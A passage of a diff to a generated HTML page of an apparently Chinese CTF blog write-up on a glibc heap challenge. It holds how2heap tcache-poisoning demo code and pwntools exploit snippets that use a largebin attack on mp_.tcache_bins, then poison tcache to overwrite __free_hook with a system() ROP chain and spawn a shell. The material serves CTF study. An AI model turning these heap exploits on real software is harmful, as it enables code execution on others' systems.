+<span id="cb3-86"><a href="#cb3-86" aria-hidden="true" tabindex="-1"></a>  printf<span class="op">(</span><span class="st">&quot;Target (</span><span class="sc">%p</span><span class="st">) : </span><span class="sc">%p\n</span><span class="st">&quot;</span><span class="op">,&amp;</span>target<span class="op">,(</span><span class="dt">size_t</span><span class="op">*)</span>target<span class="op">);</span></span>
+<span id="cb3-87"><a href="#cb3-87" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb3-88"><a href="#cb3-88" aria-hidden="true" tabindex="-1"></a>  printf<span class="op">(</span><span class="st">&quot;</span><span class="sc">\n</span><span class="st">&quot;</span><span class="op">);</span></span>
+<span id="cb3-89"><a href="#cb3-89" aria-hidden="true" tabindex="-1"></a>  printf<span class="op">(</span><span class="st">&quot;====================================================================</span><span class="sc">\n\n</span><span class="st">&quot;</span><span class="op">);</span></span>
+<span id="cb3-90"><a href="#cb3-90" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb3-91"><a href="#cb3-91" aria-hidden="true" tabindex="-1"></a>  assert<span class="op">((</span><span class="dt">size_t</span><span class="op">)(</span>p2<span class="op">-</span><span class="dv">2</span><span class="op">)</span> <span class="op">==</span> target<span class="op">);</span></span>
+<span id="cb3-92"><a href="#cb3-92" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb3-93"><a href="#cb3-93" aria-hidden="true" tabindex="-1"></a>  <span class="cf">return</span> <span class="dv">0</span><span class="op">;</span></span>
+<span id="cb3-94"><a href="#cb3-94" aria-hidden="true" tabindex="-1"></a><span class="op">&#125;</span></span></code></pre></div>
 <p>贴出相应exp</p>
-<pre><code class="lang-python">global_max_fast_addr = libc.address + 0x1e6e98
-mp_tcachebins_addr = libc.address + 0x1e32d0
-delete(0)
-add(4,0x738)
-delete(2)
-show_addr(&#39;heap_base&#39;,heap_base)
-edit(0,p64(libc.address+0x1e40b0) + p64(libc.address+0x1e40b0)+ p64(heap_base+0x290) + p64(mp_tcachebins_addr - 0x20))
-show_addr(&#39;global_max_fast_addr&#39;,global_max_fast_addr)
-show_addr(&#39;mp_tcachebins_addr&#39;,mp_tcachebins_addr)
-add(5,0x738)
-# fastbin_ptr= libc.address + 0x1e3c00 + 8
-# idx=(libc.sym[&#39;__free_hook&#39;]-fastbin_ptr)/8
-# size=idx*0x10+0x20
-# show_addr(&#39;size&#39;,int(size))
-# size = 0x6490 size过大 直接global_max_fast改不了
-# 改完分配不了内存 malloc(): memory corruption (fast)
-#换tcachebins
-#打tcache_posioning
-</code></pre>
-<p>经过尝试后改global_max_fast之后无法分配内存，报错<em>malloc(): memory corruption (fast)</em>原因尚待探究。</p>
+<div class="sourceCode" id="cb4"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb4-1"><a href="#cb4-1" aria-hidden="true" tabindex="-1"></a>global_max_fast_addr <span class="op">=</span> libc.address <span class="op">+</span> <span class="bn">0x1e6e98</span></span>
+<span id="cb4-2"><a href="#cb4-2" aria-hidden="true" tabindex="-1"></a>mp_tcachebins_addr <span class="op">=</span> libc.address <span class="op">+</span> <span class="bn">0x1e32d0</span></span>
+<span id="cb4-3"><a href="#cb4-3" aria-hidden="true" tabindex="-1"></a>delete(<span class="dv">0</span>)</span>
+<span id="cb4-4"><a href="#cb4-4" aria-hidden="true" tabindex="-1"></a>add(<span class="dv">4</span>,<span class="bn">0x738</span>)</span>
+<span id="cb4-5"><a href="#cb4-5" aria-hidden="true" tabindex="-1"></a>delete(<span class="dv">2</span>)</span>
+<span id="cb4-6"><a href="#cb4-6" aria-hidden="true" tabindex="-1"></a>show_addr(<span class="st">&#39;heap_base&#39;</span>,heap_base)</span>
+<span id="cb4-7"><a href="#cb4-7" aria-hidden="true" tabindex="-1"></a>edit(<span class="dv">0</span>,p64(libc.address<span class="op">+</span><span class="bn">0x1e40b0</span>) <span class="op">+</span> p64(libc.address<span class="op">+</span><span class="bn">0x1e40b0</span>)<span class="op">+</span> p64(heap_base<span class="op">+</span><span class="bn">0x290</span>) <span class="op">+</span> p64(mp_tcachebins_addr <span class="op">-</span> <span class="bn">0x20</span>))</span>
+<span id="cb4-8"><a href="#cb4-8" aria-hidden="true" tabindex="-1"></a>show_addr(<span class="st">&#39;global_max_fast_addr&#39;</span>,global_max_fast_addr)</span>
+<span id="cb4-9"><a href="#cb4-9" aria-hidden="true" tabindex="-1"></a>show_addr(<span class="st">&#39;mp_tcachebins_addr&#39;</span>,mp_tcachebins_addr)</span>
+<span id="cb4-10"><a href="#cb4-10" aria-hidden="true" tabindex="-1"></a>add(<span class="dv">5</span>,<span class="bn">0x738</span>)</span>
+<span id="cb4-11"><a href="#cb4-11" aria-hidden="true" tabindex="-1"></a><span class="co"># fastbin_ptr= libc.address + 0x1e3c00 + 8</span></span>
+<span id="cb4-12"><a href="#cb4-12" aria-hidden="true" tabindex="-1"></a><span class="co"># idx=(libc.sym[&#39;__free_hook&#39;]-fastbin_ptr)/8</span></span>
+<span id="cb4-13"><a href="#cb4-13" aria-hidden="true" tabindex="-1"></a><span class="co"># size=idx*0x10+0x20</span></span>
+<span id="cb4-14"><a href="#cb4-14" aria-hidden="true" tabindex="-1"></a><span class="co"># show_addr(&#39;size&#39;,int(size))</span></span>
+<span id="cb4-15"><a href="#cb4-15" aria-hidden="true" tabindex="-1"></a><span class="co"># size = 0x6490 size过大 直接global_max_fast改不了</span></span>
+<span id="cb4-16"><a href="#cb4-16" aria-hidden="true" tabindex="-1"></a><span class="co"># 改完分配不了内存 malloc(): memory corruption (fast)</span></span>
+<span id="cb4-17"><a href="#cb4-17" aria-hidden="true" tabindex="-1"></a><span class="co">#换tcachebins</span></span>
+<span id="cb4-18"><a href="#cb4-18" aria-hidden="true" tabindex="-1"></a><span class="co">#打tcache_posioning</span></span></code></pre></div>
+<p>经过尝试后改global_max_fast之后无法分配内存，报错<em>malloc(): memory
+corruption (fast)</em>原因尚待探究。</p>
 <p>换打mp_.tcache_bins，启用tcachebins。考虑打tcachebins_posioning.同样贴出how2heap</p>
-<pre><code class="lang-c">#include &lt;stdio.h&gt;
-#include &lt;stdlib.h&gt;
-#include &lt;stdint.h&gt;
-#include &lt;assert.h&gt;
-
-int main()
-&#123;
-    // disable buffering
-    setbuf(stdin, NULL);
-    setbuf(stdout, NULL);
-
-    printf(&quot;This file demonstrates a simple tcache poisoning attack by tricking malloc into\n&quot;
-           &quot;returning a pointer to an arbitrary location (in this case, the stack).\n&quot;
-           &quot;The attack is very similar to fastbin corruption attack.\n&quot;);
-    printf(&quot;After the patch https://sourceware.org/git/?p=glibc.git;a=commit;h=77dc0d8643aa99c92bf671352b0a8adde705896f,\n&quot;
-           &quot;We have to create and free one more chunk for padding before fd pointer hijacking.\n\n&quot;);
-    printf(&quot;After the patch https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=a1a486d70ebcc47a686ff5846875eacad0940e41,\n&quot;
-           &quot;An heap address leak is needed to perform tcache poisoning.\n&quot;
-           &quot;The same patch also ensures the chunk returned by tcache is properly aligned.\n\n&quot;);
-
-    size_t stack_var[0x10];
-    size_t *target = NULL;
-
-    // choose a properly aligned target address
-    for(int i=0; i&lt;0x10; i++) &#123;
-        if(((long)&amp;stack_var[i] &amp; 0xf) == 0) &#123;
-            target = &amp;stack_var[i];
-            break;
-        &#125;
-    &#125;
-    assert(target != NULL);
-
-    printf(&quot;The address we want malloc() to return is %p.\n&quot;, target);
-
-    printf(&quot;Allocating 2 buffers.\n&quot;);
-    intptr_t *a = malloc(128);
-    printf(&quot;malloc(128): %p\n&quot;, a);
-    intptr_t *b = malloc(128);
-    printf(&quot;malloc(128): %p\n&quot;, b);
-
-    printf(&quot;Freeing the buffers...\n&quot;);
-    free(a);
-    free(b);
-
-    printf(&quot;Now the tcache list has [ %p -&gt; %p ].\n&quot;, b, a);
-    printf(&quot;We overwrite the first %lu bytes (fd/next pointer) of the data at %p\n&quot;
-           &quot;to point to the location to control (%p).\n&quot;, sizeof(intptr_t), b, target);
-    // VULNERABILITY
-    // the following operation assumes the address of b is known, which requires a heap leak
-    b[0] = (intptr_t)((long)target ^ (long)b &gt;&gt; 12);
-    // VULNERABILITY
-    printf(&quot;Now the tcache list has [ %p -&gt; %p ].\n&quot;, b, target);
-
-    printf(&quot;1st malloc(128): %p\n&quot;, malloc(128));
-    printf(&quot;Now the tcache list has [ %p ].\n&quot;, target);
-
-    intptr_t *c = malloc(128);
-    printf(&quot;2nd malloc(128): %p\n&quot;, c);
-    printf(&quot;We got the control\n&quot;);
-
-    assert((long)target == (long)c);
-    return 0;
-&#125;
-</code></pre>
+<div class="sourceCode" id="cb5"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb5-1"><a href="#cb5-1" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;stdio.h&gt;</span></span>
+<span id="cb5-2"><a href="#cb5-2" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;stdlib.h&gt;</span></span>
+<span id="cb5-3"><a href="#cb5-3" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;stdint.h&gt;</span></span>
+<span id="cb5-4"><a href="#cb5-4" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;assert.h&gt;</span></span>
+<span id="cb5-5"><a href="#cb5-5" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb5-6"><a href="#cb5-6" aria-hidden="true" tabindex="-1"></a><span class="dt">int</span> main<span class="op">()</span></span>
+<span id="cb5-7"><a href="#cb5-7" aria-hidden="true" tabindex="-1"></a><span class="op">&#123;</span></span>
+<span id="cb5-8"><a href="#cb5-8" aria-hidden="true" tabindex="-1"></a>    <span class="co">// disable buffering</span></span>
+<span id="cb5-9"><a href="#cb5-9" aria-hidden="true" tabindex="-1"></a>    setbuf<span class="op">(</span>stdin<span class="op">,</span> NULL<span class="op">);</span></span>
+<span id="cb5-10"><a href="#cb5-10" aria-hidden="true" tabindex="-1"></a>    setbuf<span class="op">(</span>stdout<span class="op">,</span> NULL<span class="op">);</span></span>
+<span id="cb5-11"><a href="#cb5-11" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb5-12"><a href="#cb5-12" aria-hidden="true" tabindex="-1"></a>    printf<span class="op">(</span><span class="st">&quot;This file demonstrates a simple tcache poisoning attack by tricking malloc into</span><span class="sc">\n</span><span class="st">&quot;</span></span>
+<span id="cb5-13"><a href="#cb5-13" aria-hidden="true" tabindex="-1"></a>           <span class="st">&quot;returning a pointer to an arbitrary location (in this case, the stack).</span><span class="sc">\n</span><span class="st">&quot;</span></span>
+<span id="cb5-14"><a href="#cb5-14" aria-hidden="true" tabindex="-1"></a>           <span class="st">&quot;The attack is very similar to fastbin corruption attack.</span><span class="sc">\n</span><span class="st">&quot;</span><span class="op">);</span></span>
+<span id="cb5-15"><a href="#cb5-15" aria-hidden="true" tabindex="-1"></a>    printf<span class="op">(</span><span class="st">&quot;After the patch https://sourceware.org/git/?p=glibc.git;a=commit;h=77dc0d8643aa99c92bf671352b0a8adde705896f,</span><span class="sc">\n</span><span class="st">&quot;</span></span>
+<span id="cb5-16"><a href="#cb5-16" aria-hidden="true" tabindex="-1"></a>           <span class="st">&quot;We have to create and free one more chunk for padding before fd pointer hijacking.</span><span class="sc">\n\n</span><span class="st">&quot;</span><span class="op">);</span></span>
+<span id="cb5-17"><a href="#cb5-17" aria-hidden="true" tabindex="-1"></a>    printf<span class="op">(</span><span class="st">&quot;After the patch https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=a1a486d70ebcc47a686ff5846875eacad0940e41,</span><span class="sc">\n</span><span class="st">&quot;</span></span>
+<span id="cb5-18"><a href="#cb5-18" aria-hidden="true" tabindex="-1"></a>           <span class="st">&quot;An heap address leak is needed to perform tcache poisoning.</span><span class="sc">\n</span><span class="st">&quot;</span></span>
+<span id="cb5-19"><a href="#cb5-19" aria-hidden="true" tabindex="-1"></a>           <span class="st">&quot;The same patch also ensures the chunk returned by tcache is properly aligned.</span><span class="sc">\n\n</span><span class="st">&quot;</span><span class="op">);</span></span>
+<span id="cb5-20"><a href="#cb5-20" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb5-21"><a href="#cb5-21" aria-hidden="true" tabindex="-1"></a>    <span class="dt">size_t</span> stack_var<span class="op">[</span><span class="bn">0x10</span><span class="op">];</span></span>
+<span id="cb5-22"><a href="#cb5-22" aria-hidden="true" tabindex="-1"></a>    <span class="dt">size_t</span> <span class="op">*</span>target <span class="op">=</span> NULL<span class="op">;</span></span>
+<span id="cb5-23"><a href="#cb5-23" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb5-24"><a href="#cb5-24" aria-hidden="true" tabindex="-1"></a>    <span class="co">// choose a properly aligned target address</span></span>
+<span id="cb5-25"><a href="#cb5-25" aria-hidden="true" tabindex="-1"></a>    <span class="cf">for</span><span class="op">(</span><span class="dt">int</span> i<span class="op">=</span><span class="dv">0</span><span class="op">;</span> i<span class="op">&lt;</span><span class="bn">0x10</span><span class="op">;</span> i<span class="op">++)</span> <span class="op">&#123;</span></span>
+<span id="cb5-26"><a href="#cb5-26" aria-hidden="true" tabindex="-1"></a>        <span class="cf">if</span><span class="op">(((</span><span class="dt">long</span><span class="op">)&amp;</span>stack_var<span class="op">[</span>i<span class="op">]</span> <span class="op">&amp;</span> <span class="bn">0xf</span><span class="op">)</span> <span class="op">==</span> <span class="dv">0</span><span class="op">)</span> <span class="op">&#123;</span></span>
+<span id="cb5-27"><a href="#cb5-27" aria-hidden="true" tabindex="-1"></a>            target <span class="op">=</span> <span class="op">&amp;</span>stack_var<span class="op">[</span>i<span class="op">];</span></span>
+<span id="cb5-28"><a href="#cb5-28" aria-hidden="true" tabindex="-1"></a>            <span class="cf">break</span><span class="op">;</span></span>
+<span id="cb5-29"><a href="#cb5-29" aria-hidden="true" tabindex="-1"></a>        <span class="op">&#125;</span></span>
+<span id="cb5-30"><a href="#cb5-30" aria-hidden="true" tabindex="-1"></a>    <span class="op">&#125;</span></span>
+<span id="cb5-31"><a href="#cb5-31" aria-hidden="true" tabindex="-1"></a>    assert<span class="op">(</span>target <span class="op">!=</span> NULL<span class="op">);</span></span>
+<span id="cb5-32"><a href="#cb5-32" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb5-33"><a href="#cb5-33" aria-hidden="true" tabindex="-1"></a>    printf<span class="op">(</span><span class="st">&quot;The address we want malloc() to return is </span><span class="sc">%p</span><span class="st">.</span><span class="sc">\n</span><span class="st">&quot;</span><span class="op">,</span> target<span class="op">);</span></span>
+<span id="cb5-34"><a href="#cb5-34" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb5-35"><a href="#cb5-35" aria-hidden="true" tabindex="-1"></a>    printf<span class="op">(</span><span class="st">&quot;Allocating 2 buffers.</span><span class="sc">\n</span><span class="st">&quot;</span><span class="op">);</span></span>
+<span id="cb5-36"><a href="#cb5-36" aria-hidden="true" tabindex="-1"></a>    <span class="dt">intptr_t</span> <span class="op">*</span>a <span class="op">=</span> malloc<span class="op">(</span><span class="dv">128</span><span class="op">);</span></span>
+<span id="cb5-37"><a href="#cb5-37" aria-hidden="true" tabindex="-1"></a>    printf<span class="op">(</span><span class="st">&quot;malloc(128): </span><span class="sc">%p\n</span><span class="st">&quot;</span><span class="op">,</span> a<span class="op">);</span></span>
+<span id="cb5-38"><a href="#cb5-38" aria-hidden="true" tabindex="-1"></a>    <span class="dt">intptr_t</span> <span class="op">*</span>b <span class="op">=</span> malloc<span class="op">(</span><span class="dv">128</span><span class="op">);</span></span>
+<span id="cb5-39"><a href="#cb5-39" aria-hidden="true" tabindex="-1"></a>    printf<span class="op">(</span><span class="st">&quot;malloc(128): </span><span class="sc">%p\n</span><span class="st">&quot;</span><span class="op">,</span> b<span class="op">);</span></span>
+<span id="cb5-40"><a href="#cb5-40" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb5-41"><a href="#cb5-41" aria-hidden="true" tabindex="-1"></a>    printf<span class="op">(</span><span class="st">&quot;Freeing the buffers...</span><span class="sc">\n</span><span class="st">&quot;</span><span class="op">);</span></span>
+<span id="cb5-42"><a href="#cb5-42" aria-hidden="true" tabindex="-1"></a>    free<span class="op">(</span>a<span class="op">);</span></span>
+<span id="cb5-43"><a href="#cb5-43" aria-hidden="true" tabindex="-1"></a>    free<span class="op">(</span>b<span class="op">);</span></span>
+<span id="cb5-44"><a href="#cb5-44" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb5-45"><a href="#cb5-45" aria-hidden="true" tabindex="-1"></a>    printf<span class="op">(</span><span class="st">&quot;Now the tcache list has [ </span><span class="sc">%p</span><span class="st"> -&gt; </span><span class="sc">%p</span><span class="st"> ].</span><span class="sc">\n</span><span class="st">&quot;</span><span class="op">,</span> b<span class="op">,</span> a<span class="op">);</span></span>
+<span id="cb5-46"><a href="#cb5-46" aria-hidden="true" tabindex="-1"></a>    printf<span class="op">(</span><span class="st">&quot;We overwrite the first </span><span class="sc">%lu</span><span class="st"> bytes (fd/next pointer) of the data at </span><span class="sc">%p\n</span><span class="st">&quot;</span></span>
+<span id="cb5-47"><a href="#cb5-47" aria-hidden="true" tabindex="-1"></a>           <span class="st">&quot;to point to the location to control (</span><span class="sc">%p</span><span class="st">).</span><span class="sc">\n</span><span class="st">&quot;</span><span class="op">,</span> <span class="kw">sizeof</span><span class="op">(</span><span class="dt">intptr_t</span><span class="op">),</span> b<span class="op">,</span> target<span class="op">);</span></span>
+<span id="cb5-48"><a href="#cb5-48" aria-hidden="true" tabindex="-1"></a>    <span class="co">// VULNERABILITY</span></span>
+<span id="cb5-49"><a href="#cb5-49" aria-hidden="true" tabindex="-1"></a>    <span class="co">// the following operation assumes the address of b is known, which requires a heap leak</span></span>
+<span id="cb5-50"><a href="#cb5-50" aria-hidden="true" tabindex="-1"></a>    b<span class="op">[</span><span class="dv">0</span><span class="op">]</span> <span class="op">=</span> <span class="op">(</span><span class="dt">intptr_t</span><span class="op">)((</span><span class="dt">long</span><span class="op">)</span>target <span class="op">^</span> <span class="op">(</span><span class="dt">long</span><span class="op">)</span>b <span class="op">&gt;&gt;</span> <span class="dv">12</span><span class="op">);</span></span>
+<span id="cb5-51"><a href="#cb5-51" aria-hidden="true" tabindex="-1"></a>    <span class="co">// VULNERABILITY</span></span>
+<span id="cb5-52"><a href="#cb5-52" aria-hidden="true" tabindex="-1"></a>    printf<span class="op">(</span><span class="st">&quot;Now the tcache list has [ </span><span class="sc">%p</span><span class="st"> -&gt; </span><span class="sc">%p</span><span class="st"> ].</span><span class="sc">\n</span><span class="st">&quot;</span><span class="op">,</span> b<span class="op">,</span> target<span class="op">);</span></span>
+<span id="cb5-53"><a href="#cb5-53" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb5-54"><a href="#cb5-54" aria-hidden="true" tabindex="-1"></a>    printf<span class="op">(</span><span class="st">&quot;1st malloc(128): </span><span class="sc">%p\n</span><span class="st">&quot;</span><span class="op">,</span> malloc<span class="op">(</span><span class="dv">128</span><span class="op">));</span></span>
+<span id="cb5-55"><a href="#cb5-55" aria-hidden="true" tabindex="-1"></a>    printf<span class="op">(</span><span class="st">&quot;Now the tcache list has [ </span><span class="sc">%p</span><span class="st"> ].</span><span class="sc">\n</span><span class="st">&quot;</span><span class="op">,</span> target<span class="op">);</span></span>
+<span id="cb5-56"><a href="#cb5-56" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb5-57"><a href="#cb5-57" aria-hidden="true" tabindex="-1"></a>    <span class="dt">intptr_t</span> <span class="op">*</span>c <span class="op">=</span> malloc<span class="op">(</span><span class="dv">128</span><span class="op">);</span></span>
+<span id="cb5-58"><a href="#cb5-58" aria-hidden="true" tabindex="-1"></a>    printf<span class="op">(</span><span class="st">&quot;2nd malloc(128): </span><span class="sc">%p\n</span><span class="st">&quot;</span><span class="op">,</span> c<span class="op">);</span></span>
+<span id="cb5-59"><a href="#cb5-59" aria-hidden="true" tabindex="-1"></a>    printf<span class="op">(</span><span class="st">&quot;We got the control</span><span class="sc">\n</span><span class="st">&quot;</span><span class="op">);</span></span>
+<span id="cb5-60"><a href="#cb5-60" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb5-61"><a href="#cb5-61" aria-hidden="true" tabindex="-1"></a>    assert<span class="op">((</span><span class="dt">long</span><span class="op">)</span>target <span class="op">==</span> <span class="op">(</span><span class="dt">long</span><span class="op">)</span>c<span class="op">);</span></span>
+<span id="cb5-62"><a href="#cb5-62" aria-hidden="true" tabindex="-1"></a>    <span class="cf">return</span> <span class="dv">0</span><span class="op">;</span></span>
+<span id="cb5-63"><a href="#cb5-63" aria-hidden="true" tabindex="-1"></a><span class="op">&#125;</span></span></code></pre></div>
 <p>相应exp</p>
-<pre><code class="lang-python">add(10,0x900)
-add(11,0x900)
-delete(10)
-delete(11)
-# pause()
-xor_free_hook = libc.sym[&#39;__free_hook&#39;] ^ ((heap_base + 0x3290)&gt;&gt; 12)
-edit(11,p64(xor_free_hook))
-add(13,0x900)
-add(14,0x900)
-rop = ROP(libc)
-
-rop.system()
-info(rop.dump())
-edit(14,rop.chain())
-edit(13,b&#39;/bin/sh\x00&#39;)
-show_addr(&#39;__free_hook&#39;,libc.sym[&#39;__free_hook&#39;])
-pause()
-delete(13)
-r.interactive()
-</code></pre>
+<div class="sourceCode" id="cb6"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb6-1"><a href="#cb6-1" aria-hidden="true" tabindex="-1"></a>add(<span class="dv">10</span>,<span class="bn">0x900</span>)</span>
+<span id="cb6-2"><a href="#cb6-2" aria-hidden="true" tabindex="-1"></a>add(<span class="dv">11</span>,<span class="bn">0x900</span>)</span>
+<span id="cb6-3"><a href="#cb6-3" aria-hidden="true" tabindex="-1"></a>delete(<span class="dv">10</span>)</span>
+<span id="cb6-4"><a href="#cb6-4" aria-hidden="true" tabindex="-1"></a>delete(<span class="dv">11</span>)</span>
+<span id="cb6-5"><a href="#cb6-5" aria-hidden="true" tabindex="-1"></a><span class="co"># pause()</span></span>
+<span id="cb6-6"><a href="#cb6-6" aria-hidden="true" tabindex="-1"></a>xor_free_hook <span class="op">=</span> libc.sym[<span class="st">&#39;__free_hook&#39;</span>] <span class="op">^</span> ((heap_base <span class="op">+</span> <span class="bn">0x3290</span>)<span class="op">&gt;&gt;</span> <span class="dv">12</span>)</span>
+<span id="cb6-7"><a href="#cb6-7" aria-hidden="true" tabindex="-1"></a>edit(<span class="dv">11</span>,p64(xor_free_hook))</span>
+<span id="cb6-8"><a href="#cb6-8" aria-hidden="true" tabindex="-1"></a>add(<span class="dv">13</span>,<span class="bn">0x900</span>)</span>
+<span id="cb6-9"><a href="#cb6-9" aria-hidden="true" tabindex="-1"></a>add(<span class="dv">14</span>,<span class="bn">0x900</span>)</span>
+<span id="cb6-10"><a href="#cb6-10" aria-hidden="true" tabindex="-1"></a>rop <span class="op">=</span> ROP(libc)</span>
+<span id="cb6-11"><a href="#cb6-11" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb6-12"><a href="#cb6-12" aria-hidden="true" tabindex="-1"></a>rop.system()</span>
+<span id="cb6-13"><a href="#cb6-13" aria-hidden="true" tabindex="-1"></a>info(rop.dump())</span>
+<span id="cb6-14"><a href="#cb6-14" aria-hidden="true" tabindex="-1"></a>edit(<span class="dv">14</span>,rop.chain())</span>
+<span id="cb6-15"><a href="#cb6-15" aria-hidden="true" tabindex="-1"></a>edit(<span class="dv">13</span>,<span class="st">b&#39;/bin/sh</span><span class="ch">\x00</span><span class="st">&#39;</span>)</span>
+<span id="cb6-16"><a href="#cb6-16" aria-hidden="true" tabindex="-1"></a>show_addr(<span class="st">&#39;__free_hook&#39;</span>,libc.sym[<span class="st">&#39;__free_hook&#39;</span>])</span>
+<span id="cb6-17"><a href="#cb6-17" aria-hidden="true" tabindex="-1"></a>pause()</span>
+<span id="cb6-18"><a href="#cb6-18" aria-hidden="true" tabindex="-1"></a>delete(<span class="dv">13</span>)</span>
+<span id="cb6-19"><a href="#cb6-19" aria-hidden="true" tabindex="-1"></a>r.interactive()</span></code></pre></div>
 <p>拿到shell。学的有点上头。</p>
 
 
@@ -814,7 +814,7 @@ r.interactive()
         <div id="toc" class="toc-article">
         <strong class="toc-title">目录</strong>
         
-          <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#LargebinsAttact%E4%B8%8ETcachebinsPosioning"><span class="toc-nav-number">1.</span> <span class="toc-nav-text">LargebinsAttact与TcachebinsPosioning</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#%E9%A2%98%E7%9B%AE"><span class="toc-nav-number">1.1.</span> <span class="toc-nav-text">题目</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link"><span class="toc-nav-number">1.2.</span> <span class="toc-nav-text"> </span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF"><span class="toc-nav-number">1.3.</span> <span class="toc-nav-text">解题思路</span></a></li></ol></li></ol>
+          <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#largebinsattact%E4%B8%8Etcachebinsposioning"><span class="toc-nav-number">1.</span> <span class="toc-nav-text">LargebinsAttact与TcachebinsPosioning</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#%E9%A2%98%E7%9B%AE"><span class="toc-nav-number">1.1.</span> <span class="toc-nav-text">题目</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#section"><span class="toc-nav-number">1.2.</span> <span class="toc-nav-text"></span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF"><span class="toc-nav-number">1.3.</span> <span class="toc-nav-text">解题思路</span></a></li></ol></li></ol>
         
         </div>
       </aside>
@@ -1338,6 +1338,21 @@ start: '#bbbbee', end: '#0085a1' } }; $('#tag_cloud a').tagcloud(); }) } </scrip
 		<style type="text/css">code[class*="language-"], pre[class*="language-"] { white-space: pre !important; }</style>
 
 		
-	</body>
+	<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+        tex2jax: {
+            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
+            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
+            processEscapes: true
+        }
+    });
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax();
+        for (var i = 0; i < all.length; ++i)
+            all[i].SourceElement().parentNode.className += ' has-jax';
+    });
+</script>
+<script src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+</body>
 </html>
 
